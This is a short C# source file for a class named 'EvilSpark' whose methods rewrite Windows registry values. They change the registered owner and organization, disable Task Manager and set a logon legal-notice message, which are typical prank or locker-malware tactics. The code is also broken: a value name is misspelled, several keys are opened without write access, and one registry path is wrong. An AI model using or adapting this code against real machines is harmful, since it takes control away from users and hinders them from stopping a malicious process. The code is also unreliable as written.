using System.IO;
using System;
using Microsoft.Win32;

class EvilSpark
{
    static void Main()
    {
        
    }
    public void ChangeRegisteredOwner(string name)
    {
        using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion",true))
        {
            if (key != null)
            {
                key.SetValue("RegisteredOwner", name);
            }
        }
    }
    public void ChangeRegisteredOrganization(string name)
    {
        using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion",true))
        {
            if (key != null)
            {
                key.SetValue("Registeredrganization", name);
            }
        }
    }
    public void DisableTaskManager()
    {
        using(var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
        {
            key.SetValue("DisableTaskMgr", "1");
        }
    }
    public void EnableTaskManager()
    {
        using(var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
        {
            key.DeleteValue("DisableTaskMgr");
        }
    }
    
    public void SetLegalNoticeCaptionAndText(string caption, string text)
    {
        using(var key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\Current Version\Policies\System"))
        {
            key.SetValue("legalnoticecaption", caption);
            key.SetValue("legalnoticetext", text);
        }
    }
    
}
    
    
    
    
    
    
    
